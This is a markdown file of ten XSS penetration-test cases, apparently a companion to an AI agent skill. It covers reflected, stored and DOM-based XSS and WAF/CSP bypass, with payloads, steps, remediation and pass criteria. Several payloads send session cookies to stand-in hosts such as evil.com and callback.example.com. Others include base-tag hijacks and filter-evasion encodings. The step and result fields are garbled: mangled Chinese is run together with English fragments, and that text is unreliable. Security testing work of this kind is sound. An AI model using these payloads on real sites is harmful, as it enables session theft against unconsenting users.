# XSS Test Cases

> This file is a companion to `SKILL.md`, containing structured XSS test cases organized by category.

---

## A. XSS Detection

### TC-X001 | Basic XSS Detection -- Script Tag Injection
- **Severity**: HIGH
- **Prerequisites**: Objective Web applicationexistscan Test inputpoint (URL parameter、Search框、formField)；browsetoolalready open DevTools Console panel。
- **Test Steps**:
 1. inObjectiveinputpointininjection `<script>alert(1)</script>`。
 2. commitrequestandObserveresponsepage。
 3. Check DevTools Console iswhetheroutputnowpopuporerror。
 4. Use Burp Suite Repeater viewresponse HTML，Confirminputiswhetherbyoriginalsampleembed。
- **Expected Results**: such as resultinputnot throughencodingdirectoutputnowinresponse HTML inandbrowsetoolExecute `alert(1)`，thenConfirmexists Reflected XSS vulnerability。such as result `<script>` byfilterbutinput仍outputnowinresponsein，continuecontinueUseeventhandlingtoolalternativesolution (TC-X002)。
- **Objective**: Determine whether a target input point reflects unfiltered `<script>` tags into the response HTML, confirming a basic Reflected XSS vulnerability.
- **Remediation**: Implement context-aware output encoding on the server side. Use HTML entity encoding for all user-supplied data rendered in HTML body context. Deploy a Content Security Policy (CSP) with `script-src` restricted to trusted sources to mitigate the impact of any injection that bypasses encoding.
- **Pass Criteria**:
  - [ ] `<script>alert(1)</script>` payload submitted to at least one input point
  - [ ] Response HTML inspected for unencoded reflection of the payload
  - [ ] DevTools Console checked for alert execution or JavaScript errors
  - [ ] Result clearly recorded: confirmed XSS OR `<script>` filtered but input still reflected
- **Reference**: payloads.md §1 (XSS detectpayload)

### TC-X002 | Event Handler Alternative Detection
- **Severity**: HIGH
- **Objective**: Bypass basic `<script>` tag filtering by using HTML event handler attributes to achieve JavaScript execution, proving the XSS vulnerability persists despite tag-level controls.
- **Prerequisites**: basic detect (TC-X001) Confirm `<script>` tagbyfilterorstrip，butinput仍anti映inresponse HTML in。
- **Test Steps**:
 1. 依timeinjectionwithbeloweventhandlingtoolpayload:
 - `<img src=x onerror=alert(1)>`
 - `<svg onload=alert(1)>`
 - `<input onfocus=alert(1) autofocus>`
 - `<details open ontoggle=alert(1)>`
 2. eachtimecommitafterObserveresponsepageiswhetherTriggerpopup。
 3. Record哪sometagbyfilter、哪someeventhandlingtoolcan use。
- **Expected Results**: at leastaeventhandlingtoolpayloadsuccessTrigger `alert(1)`，Confirm XSS vulnerabilityexistsandcan throughtag/eventalternativebypassfilter。
- **Remediation**: Extend input filtering beyond `<script>` tags to cover all HTML event handler attributes (onerror, onload, onfocus, ontoggle, onmouseover, etc.). Use a positive allowlist approach for accepted HTML tags and attributes rather than a blocklist. Implement CSP with `default-src 'self'` to prevent inline script execution even if HTML injection succeeds.
- **Pass Criteria**:
  - [ ] All four event handler payloads tested sequentially
  - [ ] Each payload result recorded (filtered, reflected-but-no-execution, or executed)
  - [ ] At least one successful execution confirms bypass capability
  - [ ] Filter behavior documented: which tags are stripped vs which event handlers pass through
- **Reference**: payloads.md §1 (XSS detectpayload), §5 (eventhandlingtoolalternative)

---

## B. Reflected XSS

### TC-X003 | HTML Context Reflected XSS
- **Severity**: CRITICAL
- **Prerequisites**: Objectiveapplicationexists URL parameterechosuccesscan (Search框、errormessage、redirect)；Confirminputanti映in HTML tagofinterval (nonAttributeValueor JS onbelowtext)。
- **Test Steps**:
 1. Identifyechouserinput parameter (such as `?q=`、`?name=`、`?error=`)。
 2. injectionbasic payload: `<script>alert(document.domain)</script>`。
 3. if `<script>` byfilter，切换to: `<img src=x onerror=alert(document.domain)>`。
 4. Verify Cookie can accessity: `<img src=x onerror=alert(document.cookie)>`。
 5. Use Burp Suite Comparerequestandresponse，Confirminput encodingstatus。
- **Expected Results**: successinaffected害erbrowsetoolonbelowtextinExecutearbitrary JavaScript，can access `document.cookie` and `document.domain`。attackneedinduceaffected害erpoint击special制link。
- **Objective**: Confirm a Reflected XSS vulnerability in an HTML body context where user input echoes back without encoding, and demonstrate cookie access to assess session hijacking risk.
- **Remediation**: Apply HTML entity encoding to all user-supplied data reflected in HTML body context. Set the `HttpOnly` flag on session cookies to prevent JavaScript access via `document.cookie`. Implement a strict Content Security Policy that disallows inline scripts. Validate and encode URL parameters on the server before rendering them in responses.
- **Pass Criteria**:
  - [ ] Echo parameter identified and documented
  - [ ] Payload successfully executes JavaScript in the victim's browser
  - [ ] `document.cookie` accessible via the injected script
  - [ ] Input encoding status confirmed via Burp Suite request/response comparison
- **Reference**: payloads.md §2 (Reflected XSS)

### TC-X004 | Attribute Value Context Escape
- **Severity**: CRITICAL
- **Prerequisites**: throughresponseAnalyzeConfirmuserinput落in HTML AttributeValueinternal (such as `<input value="USER_INPUT">`)。
- **Test Steps**:
 1. injectiondouble quoteclosureAttribute: `" onmouseover=alert(1) "`。
 2. such as resultdouble quotebyencoding，Attemptsingle quote: `' onfocus=alert(1) autofocus x='`。
 3. Attempt JavaScript onbelowtextescape (ifinputin `<script>` taginner): `';alert(1);//`。
 4. VerifyConstruct AttributeiswhetherbybrowsetoolsolveanalysisExecute。
- **Expected Results**: successescapeAttributeValueonbelowtext，injectionnew eventhandlingtoolAttributeandbybrowsetoolExecute。
- **Objective**: Escape from an HTML attribute value context by breaking out of the attribute enclosure, demonstrating that input sanitization does not account for attribute-level injection vectors.
- **Remediation**: Apply HTML attribute encoding (escaping `"`, `'`, `>`, `<`, `&`) to all user input placed inside HTML attribute values. Use templating engines that auto-escape by default. Avoid placing user-controlled data directly in JavaScript string literals; use `JSON.stringify()` with proper escaping instead.
- **Pass Criteria**:
  - [ ] Attribute context confirmed via response analysis before testing
  - [ ] Double-quote escape payload tested
  - [ ] Single-quote escape payload tested as fallback
  - [ ] JavaScript context escape tested if input appears inside `<script>` tags
  - [ ] Successful attribute breakout demonstrated or all vectors documented as blocked
- **Reference**: payloads.md §2 (Reflected XSS)

---

## C. Stored XSS

### TC-X005 | User Input Field Stored XSS
- **Severity**: CRITICAL
- **Prerequisites**: Objectiveapplicationexistsuserinputpersistencesuccesscan (评theory、user昵称、personal简介、messagesystem)；havehasnormaluseraccount。
- **Test Steps**:
 1. inuser昵称Fieldinjection: `<img src=x onerror=alert(document.cookie)>`。
 2. in评theoryFieldinjection: `<svg onload=fetch('https://callback.example.com?c='+document.cookie)>`。
 3. uploadfile，filenamesetas: `"><svg onload=alert(1)>.png`。
 4. Use另auseraccountaccesscontainson述input page。
 5. ObserveNo.二userbrowsetooliswhetherTrigger maliciousscript。
- **Expected Results**: maliciouspayloadbyserviceendpersistencestorage，any accessthepage userbrowsetoolallwillExecuteinjection script。impactscope远largeat Reflected XSS，noneedinducepoint击special制link。
- **Objective**: Demonstrate a Stored XSS attack through user-input fields that persist data server-side, verifying that injected scripts execute for any user who views the affected page without requiring a crafted link.
- **Remediation**: Sanitize all user-submitted content on the server before storage using an HTML sanitization library (e.g., DOMPurify on the server side). Encode output when rendering stored data in HTML context. Set `HttpOnly` and `Secure` flags on all session cookies. Implement Content Security Policy headers to limit script execution sources.
- **Pass Criteria**:
  - [ ] Malicious payload injected via at least 2 different input fields (nickname, comment, filename)
  - [ ] Payload persisted across page loads (verified by second user account)
  - [ ] Script executes in a different user's browser upon viewing
  - [ ] All injection vectors documented with stored location and trigger page
- **Reference**: payloads.md §3 (Stored XSS)

### TC-X006 | HTTP Header Stored XSS (Admin Panel Reflection)
- **Severity**: CRITICAL
- **Prerequisites**: Objectiveapplicationafter台managementsystemwillRecordandecho HTTP Header information (User-Agent、Referer)；canpush断after台managementpanel exists。
- **Test Steps**:
 1. Use Burp Suite interceptrequest，modify User-Agent as: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`。
 2. modify Referer Header as: `<img src=x onerror=fetch('https://callback.example.com?c='+document.cookie)>`。
 3. Useadministratoraccountloginafter台，viewlog/Statisticspage。
 4. ObserveadministratorbrowsetooliswhetherTrigger maliciousscript。
- **Expected Results**: administratorinafter台viewlogwhen Trigger XSS，attackercan stealadministrator Session Cookie。此classvulnerabilityoftenbyignore，becauseasTestertypically看nottoafter台echo。
- **Objective**: Exploit server-side logging of HTTP headers (User-Agent, Referer) that are reflected unsanitized in an admin panel, achieving blind Stored XSS against administrative users.
- **Remediation**: Sanitize all HTTP header values before logging or rendering in any admin interface. Encode header-derived data with HTML entity encoding when displayed. Restrict admin panel access to specific IP ranges. Implement `HttpOnly` and `SameSite` cookie attributes to reduce the impact of any successful XSS against admin sessions.
- **Pass Criteria**:
  - [ ] Malicious payload injected via User-Agent and/or Referer headers
  - [ ] Admin panel logs/rendering confirmed to reflect header values
  - [ ] Script executes when admin views the log/statistics page
  - [ ] Session cookie exfiltration path documented (or confirmed blocked by HttpOnly)
- **Reference**: payloads.md §3 (Stored XSS), §11 (blindhit XSS)

---

## D. DOM-based XSS

### TC-X007 | innerHTML DOM XSS
- **Severity**: CRITICAL
- **Prerequisites**: throughsourcecodeauditor黑盒TestDiscoverfrontendcodeUse `innerHTML`、`outerHTML` or `document.write` writefrom URL data。
- **Test Steps**:
 1. auditfrontend JavaScript sourcecode，locateUse `innerHTML` codepath。
 2. Identifydatasource (`location.hash`、`location.search`、`document.referrer`)。
 3. Construct Payload: `https://target.com/page#<img src=x onerror=alert(1)>`。
 4. inbrowsetoolinaccessConstruct URL，Observeiswhetherpopup。
 5. Use DevTools Elements panelCheck DOM sectionpointiswhetherbyinjection。
- **Expected Results**: from URL malicious HTML bydirectwrite DOM andbybrowsetoolsolveanalysisExecute，noneedserviceendparameterand。Payload notwilloutputnowinserviceendlogin，increase Detectdifficultdegree。
- **Objective**: Exploit client-side DOM manipulation via `innerHTML` (or similar sinks) that write URL-derived data into the page without sanitization, achieving XSS entirely on the client side with no server-side parameter involved.
- **Remediation**: Replace `innerHTML` with `textContent` or `innerText` when inserting untrusted data into the DOM. If HTML rendering is required, sanitize the input with DOMPurify before assignment. Avoid using `document.write` entirely. Implement a strict CSP with `unsafe-inline` disabled to prevent inline script execution from DOM-based injection.
- **Pass Criteria**:
  - [ ] Frontend source code audited for `innerHTML`, `outerHTML`, or `document.write` sinks
  - [ ] Data source identified (location.hash, location.search, document.referrer)
  - [ ] Constructed URL payload triggers JavaScript execution
  - [ ] DOM injection confirmed via DevTools Elements panel
- **Reference**: payloads.md §4 (DOM-based XSS)

### TC-X008 | jQuery Selector DOM XSS
- **Severity**: HIGH
- **Prerequisites**: ObjectiveapplicationUse jQuery library (specialotheris 3.5.0 ofbefore version)，existswillusercan 控datatransmit给 `$().html()` codepath。
- **Test Steps**:
 1. Confirm jQuery versionnumber (DevTools Console input `$.fn.jquery`)。
 2. such as resultversion < 3.5.0，Test CVE-2020-11022/23 relatedexploit。
 3. locateUse `$().html()` or `$()` selecttoolinjection codepath。
 4. Construct Payload: `https://target.com/page#<img src/x onerror=alert(1)>`。
 5. Verify jQuery iswhetherwill hash Valuetransmit给 `.html()` method。
- **Expected Results**: exploit jQuery HTML solveanalysisspecialityinclientExecuteinjectionscript。oldversion jQuery `jQuery.htmlPrefilter` willwillfromclosuretagtransformas开闭tagfor，can byexploitbypasssomesomefilter。
- **Objective**: Exploit known jQuery DOM injection vulnerabilities (CVE-2020-11022/23) in versions before 3.5.0, where `jQuery.htmlPrefilter` transforms self-closing tags in a way that bypasses certain XSS filters.
- **Remediation**: Upgrade jQuery to version 3.5.0 or later which patches CVE-2020-11022 and CVE-2020-11023. If upgrade is not immediately possible, apply the jQuery Migrate plugin patch as a temporary mitigation. Avoid passing untrusted data directly to `$().html()` or `$()` selector methods.
- **Pass Criteria**:
  - [ ] jQuery version confirmed via DevTools Console
  - [ ] If version < 3.5.0, CVE-2020-11022/23 exploit vectors tested
  - [ ] `$().html()` injection path located in source code
  - [ ] Hash-based payload triggers script execution or transformation documented
- **Reference**: payloads.md §4 (DOM-based XSS)

---

## E. WAF / CSP Bypass

### TC-X009 | WAF Rule Bypass
- **Severity**: HIGH
- **Prerequisites**: basic XSS Payload byConfirmcan injectionbutby WAF intercept (HTTP 403 responseor Payload bystrip)；already Identify XSS vulnerabilitypoint。
- **Test Steps**:
 1. 依timeTestwithbelowbypasstechnique:
 - mixed case: `<ScRiPt>alert(1)</ScRiPt>`
 - HTML Entity encoding: `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`
 - Unicode encoding: `<script>\u0061\u006c\u0065\u0072\u0074(1)</script>`
 - stringconcatenate: `<script>window['al'+'ert'](1)</script>`
 - 换row/制tablecharacter干扰: `<svg/onload\n=\nalert(1)>`
 - 空byteinjection: `<scr%00ipt>alert(1)</script>`
 2. foreachkindtechniqueRecord WAF response (through/intercept/strip)。
 3. groupcombinemultiplekindbypasstechniqueTest (such as encoding + mixed case)。
- **Expected Results**: at leastakindbypasstechniquesuccess穿over WAF，maliciousscriptinbrowsetoolinExecute。Recordeffective bypassgroupcombineused forfollow-upvulnerability exploitation。
- **Objective**: Identify at least one WAF bypass technique that successfully delivers an XSS payload past input filtering, documenting which techniques are blocked and which succeed for future exploitation.
- **Remediation**: Deploy defense-in-depth: combine WAF rules with output encoding and CSP headers so that bypassing one layer does not lead to script execution. Keep WAF rules updated for the latest encoding and obfuscation techniques. Use a positive security model (allow known-good patterns) rather than a negative model (block known-bad patterns).
- **Pass Criteria**:
  - [ ] At least 6 bypass techniques tested (mixed case, HTML entities, Unicode, concatenation, whitespace, null byte)
  - [ ] WAF response recorded for each technique (pass, block, strip)
  - [ ] At least one technique successfully bypasses the WAF and executes script
  - [ ] Effective bypass combination documented for future use
- **Reference**: payloads.md §6 (encoding bypass), §7 (WAF bypasstechnique)

### TC-X010 | CSP Policy Bypass
- **Severity**: HIGH
- **Prerequisites**: ObjectiveapplicationDeploy Content Security Policy；already Confirmexists XSS injection pointbutscriptExecuteby CSP block。
- **Test Steps**:
 1. Check CSP Header or meta tag，AnalyzepolicyConfigure:
 - iswhethercontains `unsafe-inline` or `unsafe-eval`
 - `script-src` iswhethercontainslenient domain namewhitelist
 - iswhetherhascan exploit JSONP endpoint
 2. based onpolicydefectselectbypassmethod:
 - exploit JSONP endpoint: `<script src="https://allowed.com/jsonp?callback=alert(1)">`
 - exploit base taghijack: `<base href="https://evil.com/">`
 - exploit `unsafe-eval`: `<script>eval("alert(1)")</script>`
 - exploit object tag: `<object data="data:text/html,<script>alert(1)</script>">`
 3. Use `report-uri` or `Content-Security-Policy-Report-Only` collect CSP report。
- **Expected Results**: successexploit CSP ConfiguredefectbypassscriptExecutelimitation。i.e.makenomethodbypass CSP，alsocan report CSP Configuredefectworkasinetc.riskDiscover。
- **Objective**: Analyze the target's Content Security Policy for misconfigurations (overly permissive script-src, JSONP endpoints, unsafe-inline/eval) and exploit them to achieve script execution despite CSP enforcement.
- **Remediation**: Deploy a strict CSP with `script-src 'self'` only, avoiding `unsafe-inline` and `unsafe-eval`. Remove or restrict JSONP endpoints. Use nonce-based or hash-based CSP for legitimate inline scripts. Set `base-uri 'self'` to prevent base-tag hijacking. Monitor CSP violation reports via `report-uri` to detect ongoing bypass attempts.
- **Pass Criteria**:
  - [ ] CSP header or meta tag analyzed and policy gaps documented
  - [ ] At least one CSP bypass technique tested (JSONP, base tag, unsafe-eval, object tag)
  - [ ] If bypass succeeds, script execution confirmed in browser
  - [ ] If no bypass possible, CSP misconfiguration reported as informational finding
- **Reference**: payloads.md §9 (CSP bypasstechnique)

---

## Statistics

| Category | TestCases | ID Range |
|------|-----------|---------|
| A. XSS detect | 2 | TC-X001 - TC-X002 |
| B. Reflected XSS | 2 | TC-X003 - TC-X004 |
| C. Stored XSS | 2 | TC-X005 - TC-X006 |
| D. DOM XSS | 2 | TC-X007 - TC-X008 |
| E. WAF/CSP Bypass | 2 | TC-X009 - TC-X010 |
| **Total** | **10** | **TC-X001 - TC-X010** |

### Severity Distribution

| Severity | Count | Testuseexample |
|---------|------|---------|
| CRITICAL | 5 | TC-X003, TC-X004, TC-X005, TC-X006, TC-X007 |
| HIGH | 5 | TC-X001, TC-X002, TC-X008, TC-X009, TC-X010 |
| MEDIUM | 0 | - |
| LOW | 0 | - |
